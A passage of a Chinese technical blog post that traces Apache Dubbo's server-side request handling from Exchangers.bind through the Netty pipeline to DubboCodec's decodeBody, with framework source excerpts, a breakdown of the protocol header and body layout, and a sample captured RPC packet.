&#123;</span><br><span class="line">    String type = url.getParameter(Constants.EXCHANGER_KEY, Constants.DEFAULT_EXCHANGER);</span><br><span class="line">    return getExchanger(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据URL的配置，通过SPI选择Exchanger的实现，执行bind，最后生成ExchangeServer。</p>
<p>Exchangers类中，可以看到有很多重载的bind、connect方法，bind方法返回的是ExchangeServer，connect方法返回的是ExchangeClient，下面是以前阅读dubbo源码做的一些笔记总结：</p>
<ul>
<li>ExchangeServer：服务提供者对服务暴露时，使用Protocol对象进行export，export中对其进行Exchangers.bind得到ExchangeServer，其重点为第二个参数ExchangeHandler，其被多个handler进行包装，进行了多层的处理，其为最外层，进行实际实例方法的调用invoke，然后返回Result</li>
<li>ExchangeClient：服务消费者对服务引用时，使用Protocol对象进行refer，refer中中对其进行Exchangers.connect得到ExchangeClient，然后把其封装在Invoker中，接着Invoker被proxy，当消费者执行Proxy对象方法时，其会通过InvokeInvocationHandler对Invoker进行invoke，然后Invoker调用ExchangeClient进行request，其重点为第二个参数ExchangeHandler，其被多个handler进行包装，进行了多层的处理，其为最外层，对响应进行处理DefaultFuture.received</li>
</ul>
<p>回到前面，Exchangers.bind时传入的是requestHandler：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">private ExchangeHandler requestHandler = new ExchangeHandlerAdapter() &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object reply(ExchangeChannel channel, Object message) throws RemotingException &#123;</span><br><span class="line">        if (message instanceof Invocation) &#123;</span><br><span class="line">            Invocation inv = (Invocation) message;</span><br><span class="line">            Invoker&lt;?&gt; invoker = getInvoker(channel, inv);</span><br><span class="line">            // need to consider backward-compatibility if it&apos;s a callback</span><br><span class="line">            if (Boolean.TRUE.toString().equals(inv.getAttachments().get(IS_CALLBACK_SERVICE_INVOKE))) &#123;</span><br><span class="line">                String methodsStr = invoker.getUrl().getParameters().get(&quot;methods&quot;);</span><br><span class="line">                boolean hasMethod = false;</span><br><span class="line">                if (methodsStr == null || methodsStr.indexOf(&quot;,&quot;) == -1) &#123;</span><br><span class="line">                    hasMethod = inv.getMethodName().equals(methodsStr);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    String[] methods = methodsStr.split(&quot;,&quot;);</span><br><span class="line">                    for (String method : methods) &#123;</span><br><span class="line">                        if (inv.getMethodName().equals(method)) &#123;</span><br><span class="line">                            hasMethod = true;</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                if (!hasMethod) &#123;</span><br><span class="line">                    logger.warn(new IllegalStateException(&quot;The methodName &quot; + inv.getMethodName()</span><br><span class="line">                            + &quot; not found in callback service interface ,invoke will be ignored.&quot;</span><br><span class="line">                            + &quot; please update the api interface. url is:&quot;</span><br><span class="line">                            + invoker.getUrl()) + &quot; ,invocation is :&quot; + inv);</span><br><span class="line">                    return null;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            RpcContext.getContext().setRemoteAddress(channel.getRemoteAddress());</span><br><span class="line">            return invoker.invoke(inv);</span><br><span class="line">        &#125;</span><br><span class="line">        throw new RemotingException(channel, &quot;Unsupported request: &quot;</span><br><span class="line">                + (message == null ? null : (message.getClass().getName() + &quot;: &quot; + message))</span><br><span class="line">                + &quot;, channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void received(Channel channel, Object message) throws RemotingException &#123;</span><br><span class="line">        if (message instanceof Invocation) &#123;</span><br><span class="line">            reply((ExchangeChannel) channel, message);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            super.received(channel, message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void connected(Channel channel) throws RemotingException &#123;</span><br><span class="line">        invoke(channel, Constants.ON_CONNECT_KEY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void disconnected(Channel channel) throws RemotingException &#123;</span><br><span class="line">        if (logger.isInfoEnabled()) &#123;</span><br><span class="line">            logger.info(&quot;disconnected from &quot; + channel.getRemoteAddress() + &quot;,url:&quot; + channel.getUrl());</span><br><span class="line">        &#125;</span><br><span class="line">        invoke(channel, Constants.ON_DISCONNECT_KEY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void invoke(Channel channel, String methodKey) &#123;</span><br><span class="line">        Invocation invocation = createInvocation(channel, channel.getUrl(), methodKey);</span><br><span class="line">        if (invocation != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                received(channel, invocation);</span><br><span class="line">            &#125; catch (Throwable t) &#123;</span><br><span class="line">                logger.warn(&quot;Failed to invoke event method &quot; + invocation.getMethodName() + &quot;(), cause: &quot; + t.getMessage(), t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private Invocation createInvocation(Channel channel, URL url, String methodKey) &#123;</span><br><span class="line">        String method = url.getParameter(methodKey);</span><br><span class="line">        if (method == null || method.length() == 0) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        RpcInvocation invocation = new RpcInvocation(method, new Class&lt;?&gt;[0], new Object[0]);</span><br><span class="line">        invocation.setAttachment(Constants.PATH_KEY, url.getPath());</span><br><span class="line">        invocation.setAttachment(Constants.GROUP_KEY, url.getParameter(Constants.GROUP_KEY));</span><br><span class="line">        invocation.setAttachment(Constants.INTERFACE_KEY, url.getParameter(Constants.INTERFACE_KEY));</span><br><span class="line">        invocation.setAttachment(Constants.VERSION_KEY, url.getParameter(Constants.VERSION_KEY));</span><br><span class="line">        if (url.getParameter(Constants.STUB_EVENT_KEY, false)) &#123;</span><br><span class="line">            invocation.setAttachment(Constants.STUB_EVENT_KEY, Boolean.TRUE.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        return invocation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>但在bind的时候，因为默认SPI选择的是HeaderExchanger，分析它的bind方法，可以看到，其ExchangeHandler被进行了多层封装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class HeaderExchanger implements Exchanger &#123;</span><br><span class="line"></span><br><span class="line">    public static final String NAME = &quot;header&quot;;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ExchangeClient connect(URL url, ExchangeHandler handler) throws RemotingException &#123;</span><br><span class="line">        return new HeaderExchangeClient(Transporters.connect(url, new DecodeHandler(new HeaderExchangeHandler(handler))), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ExchangeServer bind(URL url, ExchangeHandler handler) throws RemotingException &#123;</span><br><span class="line">        return new HeaderExchangeServer(Transporters.bind(url, new DecodeHandler(new HeaderExchangeHandler(handler))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进Transporters.bind，可以看到，还是使用了SPI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">public static Server bind(URL url, ChannelHandler... handlers) throws RemotingException &#123;</span><br><span class="line">    if (url == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;url == null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (handlers == null || handlers.length == 0) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;handlers == null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    ChannelHandler handler;</span><br><span class="line">    if (handlers.length == 1) &#123;</span><br><span class="line">        handler = handlers[0];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        handler = new ChannelHandlerDispatcher(handlers);</span><br><span class="line">    &#125;</span><br><span class="line">    return getTransporter().bind(url, handler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Transporter getTransporter() &#123;</span><br><span class="line">    return ExtensionLoader.getExtensionLoader(Transporter.class).getAdaptiveExtension();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@SPI(&quot;netty&quot;)</span><br><span class="line">public interface Transporter &#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Bind a server.</span><br><span class="line">     *</span><br><span class="line">     * @param url     server url</span><br><span class="line">     * @param handler</span><br><span class="line">     * @return server</span><br><span class="line">     * @throws RemotingException</span><br><span class="line">     * @see com.alibaba.dubbo.remoting.Transporters#bind(URL, ChannelHandler...)</span><br><span class="line">     */</span><br><span class="line">    @Adaptive(&#123;Constants.SERVER_KEY, Constants.TRANSPORTER_KEY&#125;)</span><br><span class="line">    Server bind(URL url, ChannelHandler handler) throws RemotingException;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Connect to a server.</span><br><span class="line">     *</span><br><span class="line">     * @param url     server url</span><br><span class="line">     * @param handler</span><br><span class="line">     * @return client</span><br><span class="line">     * @throws RemotingException</span><br><span class="line">     * @see com.alibaba.dubbo.remoting.Transporters#connect(URL, ChannelHandler...)</span><br><span class="line">     */</span><br><span class="line">    @Adaptive(&#123;Constants.CLIENT_KEY, Constants.TRANSPORTER_KEY&#125;)</span><br><span class="line">    Client connect(URL url, ChannelHandler handler) throws RemotingException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据dubbo改造的SPI原理，因为我们并没有对Transporter的实现进行配置，所以，默认会选择注解@SPI(“netty”)指定的NettyTransporter实现进行bind</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class NettyTransporter implements Transporter &#123;</span><br><span class="line"></span><br><span class="line">    public static final String NAME = &quot;netty&quot;;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Server bind(URL url, ChannelHandler listener) throws RemotingException &#123;</span><br><span class="line">        return new NettyServer(url, listener);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Client connect(URL url, ChannelHandler listener) throws RemotingException &#123;</span><br><span class="line">        return new NettyClient(url, listener);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，其实服务提供者和消费者，默认最终bind和connect都执行到这里，bind创建了一个netty的服务，也就是tcp的监听器，说到netty，我们知道，一个netty服务，对于数据包的解析或者封装，都会用到pipe，而我们这篇文章的最核心点就在其中的pipe</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public class NettyServer extends AbstractServer implements Server &#123;</span><br><span class="line"></span><br><span class="line">    private static final Logger logger = LoggerFactory.getLogger(NettyServer.class);</span><br><span class="line"></span><br><span class="line">    private Map&lt;String, Channel&gt; channels; // &lt;ip:port, channel&gt;</span><br><span class="line"></span><br><span class="line">    private ServerBootstrap bootstrap;</span><br><span class="line"></span><br><span class="line">    private org.jboss.netty.channel.Channel channel;</span><br><span class="line"></span><br><span class="line">    public NettyServer(URL url, ChannelHandler handler) throws RemotingException &#123;</span><br><span class="line">        super(url, ChannelHandlers.wrap(handler, ExecutorUtil.setThreadName(url, SERVER_THREAD_POOL_NAME)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doOpen() throws Throwable &#123;</span><br><span class="line">        NettyHelper.setNettyLoggerFactory();</span><br><span class="line">        ExecutorService boss = Executors.newCachedThreadPool(new NamedThreadFactory(&quot;NettyServerBoss&quot;, true));</span><br><span class="line">        ExecutorService worker = Executors.newCachedThreadPool(new NamedThreadFactory(&quot;NettyServerWorker&quot;, true));</span><br><span class="line">        ChannelFactory channelFactory = new NioServerSocketChannelFactory(boss, worker, getUrl().getPositiveParameter(Constants.IO_THREADS_KEY, Constants.DEFAULT_IO_THREADS));</span><br><span class="line">        bootstrap = new ServerBootstrap(channelFactory);</span><br><span class="line"></span><br><span class="line">        final NettyHandler nettyHandler = new NettyHandler(getUrl(), this);</span><br><span class="line">        channels = nettyHandler.getChannels();</span><br><span class="line">        // https://issues.jboss.org/browse/NETTY-365</span><br><span class="line">        // https://issues.jboss.org/browse/NETTY-379</span><br><span class="line">        // final Timer timer = new HashedWheelTimer(new NamedThreadFactory(&quot;NettyIdleTimer&quot;, true));</span><br><span class="line">        bootstrap.setOption(&quot;child.tcpNoDelay&quot;, true);</span><br><span class="line">        bootstrap.setPipelineFactory(new ChannelPipelineFactory() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public ChannelPipeline getPipeline() &#123;</span><br><span class="line">                NettyCodecAdapter adapter = new NettyCodecAdapter(getCodec(), getUrl(), NettyServer.this);</span><br><span class="line">                ChannelPipeline pipeline = Channels.pipeline();</span><br><span class="line">                /*int idleTimeout = getIdleTimeout();</span><br><span class="line">                if (idleTimeout &gt; 10000) &#123;</span><br><span class="line">                    pipeline.addLast(&quot;timer&quot;, new IdleStateHandler(timer, idleTimeout / 1000, 0, 0));</span><br><span class="line">                &#125;*/</span><br><span class="line">                pipeline.addLast(&quot;decoder&quot;, adapter.getDecoder());</span><br><span class="line">                pipeline.addLast(&quot;encoder&quot;, adapter.getEncoder());</span><br><span class="line">                pipeline.addLast(&quot;handler&quot;, nettyHandler);</span><br><span class="line">                return pipeline;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        // bind</span><br><span class="line">        channel = bootstrap.bind(getBindAddress());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上面的代码中，可以找到pipe链有两个分别是decoder和encoder，分别是对接收的数据进行解码，以及对响应数据进行编码。其中的解码和编码器实现，从NettyCodecAdapter获取，而NettyCodecAdapter中通过内部类的方式实现了解码和编码器，但真正的核心编解码还是交给了Codec2</p>
<p>Codec2的构造，我们重新回到NettyServer的构造方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public NettyServer(URL url, ChannelHandler handler) throws RemotingException &#123;</span><br><span class="line">    super(url, ChannelHandlers.wrap(handler, ExecutorUtil.setThreadName(url, SERVER_THREAD_POOL_NAME)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续跟进其父类AbstractServer的父类AbstractEndpoint的构造方法，就能看到Codec2也是通过SPI的方式获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public AbstractEndpoint(URL url, ChannelHandler handler) &#123;</span><br><span class="line">    super(url, handler);</span><br><span class="line">    this.codec = getChannelCodec(url);</span><br><span class="line">    this.timeout = url.getPositiveParameter(Constants.TIMEOUT_KEY, Constants.DEFAULT_TIMEOUT);</span><br><span class="line">    this.connectTimeout = url.getPositiveParameter(Constants.CONNECT_TIMEOUT_KEY, Constants.DEFAULT_CONNECT_TIMEOUT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected static Codec2 getChannelCodec(URL url) &#123;</span><br><span class="line">    String codecName = url.getParameter(Constants.CODEC_KEY, &quot;telnet&quot;);</span><br><span class="line">    if (ExtensionLoader.getExtensionLoader(Codec2.class).hasExtension(codecName)) &#123;</span><br><span class="line">        return ExtensionLoader.getExtensionLoader(Codec2.class).getExtension(codecName);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return new CodecAdapter(ExtensionLoader.getExtensionLoader(Codec.class)</span><br><span class="line">                .getExtension(codecName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@SPI</span><br><span class="line">public interface Codec2 &#123;</span><br><span class="line"></span><br><span class="line">    @Adaptive(&#123;Constants.CODEC_KEY&#125;)</span><br><span class="line">    void encode(Channel channel, ChannelBuffer buffer, Object message) throws IOException;</span><br><span class="line"></span><br><span class="line">    @Adaptive(&#123;Constants.CODEC_KEY&#125;)</span><br><span class="line">    Object decode(Channel channel, ChannelBuffer buffer) throws IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    enum DecodeResult &#123;</span><br><span class="line">        NEED_MORE_INPUT, SKIP_SOME_INPUT</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么，具体这个Codec2使用的是哪个实现？我们也没对其进行配置，SPI对于的接口类中注解也没有配置默认实现。</p>
<p>其实，回到com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol#createServer中，我们可以看到，在这个方法中执行了这样一行代码，为URL重添加了一个配置参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = url.addParameter(Constants.CODEC_KEY, DubboCodec.NAME);</span><br></pre></td></tr></table></figure>
<p>所以，因为我们用的是dubbo协议，真正的Code2实现，是DubboCodec，位于module dubbo-rpc-dubbo中，包com.alibaba.dubbo.rpc.protocol.dubbo下。</p>
<p>我们暂时只关注解码，从decodeBody方法，我们可以清晰看到，dubbo协议自己定义了协议通讯时的数据包头和体：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException &#123;</span><br><span class="line">    byte flag = header[2], proto = (byte) (flag &amp; SERIALIZATION_MASK);</span><br><span class="line">    // get request id.</span><br><span class="line">    long id = Bytes.bytes2long(header, 4);</span><br><span class="line">    if ((flag &amp; FLAG_REQUEST) == 0) &#123;</span><br><span class="line">        // decode response.</span><br><span class="line">        Response res = new Response(id);</span><br><span class="line">        if ((flag &amp; FLAG_EVENT) != 0) &#123;</span><br><span class="line">            res.setEvent(true);</span><br><span class="line">        &#125;</span><br><span class="line">        // get status.</span><br><span class="line">        byte status = header[3];</span><br><span class="line">        res.setStatus(status);</span><br><span class="line">        try &#123;</span><br><span class="line">            ObjectInput in = CodecSupport.deserialize(channel.getUrl(), is, proto);</span><br><span class="line">            if (status == Response.OK) &#123;</span><br><span class="line">                Object data;</span><br><span class="line">                if (res.isHeartbeat()) &#123;</span><br><span class="line">                    data = decodeHeartbeatData(channel, in);</span><br><span class="line">                &#125; else if (res.isEvent()) &#123;</span><br><span class="line">                    data = decodeEventData(channel, in);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    data = decodeResponseData(channel, in, getRequestData(id));</span><br><span class="line">                &#125;</span><br><span class="line">                res.setResult(data);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                res.setErrorMessage(in.readUTF());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Throwable t) &#123;</span><br><span class="line">            res.setStatus(Response.CLIENT_ERROR);</span><br><span class="line">            res.setErrorMessage(StringUtils.toString(t));</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // decode request.</span><br><span class="line">        Request req = new Request(id);</span><br><span class="line">        req.setVersion(Version.getProtocolVersion());</span><br><span class="line">        req.setTwoWay((flag &amp; FLAG_TWOWAY) != 0);</span><br><span class="line">        if ((flag &amp; FLAG_EVENT) != 0) &#123;</span><br><span class="line">            req.setEvent(true);</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            ObjectInput in = CodecSupport.deserialize(channel.getUrl(), is, proto);</span><br><span class="line">            Object data;</span><br><span class="line">            if (req.isHeartbeat()) &#123;</span><br><span class="line">                data = decodeHeartbeatData(channel, in);</span><br><span class="line">            &#125; else if (req.isEvent()) &#123;</span><br><span class="line">                data = decodeEventData(channel, in);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                data = decodeRequestData(channel, in);</span><br><span class="line">            &#125;</span><br><span class="line">            req.setData(data);</span><br><span class="line">        &#125; catch (Throwable t) &#123;</span><br><span class="line">            // bad request</span><br><span class="line">            req.setBroken(true);</span><br><span class="line">            req.setData(t);</span><br><span class="line">        &#125;</span><br><span class="line">        return req;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是我对其协议的一些整理总结：</p>
<p>header：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0-7位和8-15位：Magic High和Magic Low，类似java字节码文件里的魔数，用来判断是不是dubbo协议的数据包，就是一个固定的数字</span><br><span class="line">16位：Req/Res：请求还是响应标识。</span><br><span class="line">17位：2way：单向还是双向</span><br><span class="line">18位：Event：是否是事件</span><br><span class="line">19-23位：Serialization 编号</span><br><span class="line">24-31位：status状态</span><br><span class="line">32-95位：id编号</span><br><span class="line">96-127位：body数据长度</span><br><span class="line">128-…位：body</span><br></pre></td></tr></table></figure></p>
<p>body：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.dubboVersion</span><br><span class="line">2.path</span><br><span class="line">3.version</span><br><span class="line">4.methodName</span><br><span class="line">5.methodDesc</span><br><span class="line">6.paramsObject</span><br><span class="line">7.map</span><br></pre></td></tr></table></figure></p>
<p>rpc tcp报文（ascii）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...           .G.2.0.20,com.threedr3am.learn.server.boot.DemoService.1.0.hello0$Lcom/threedr3am/learn/server/boot/A;C0&quot;com.threedr3am.learn.server.boot.A..name`.xxxxH.path0,com.threedr3am.learn.server.boot.DemoService.activelimit_filter_start_time 1577081623564 interface0,com.threedr3am.learn.server.boot.DemoService.version.1.0.timeout.3000Z</span><br></pre></td></tr></table></figure></p>
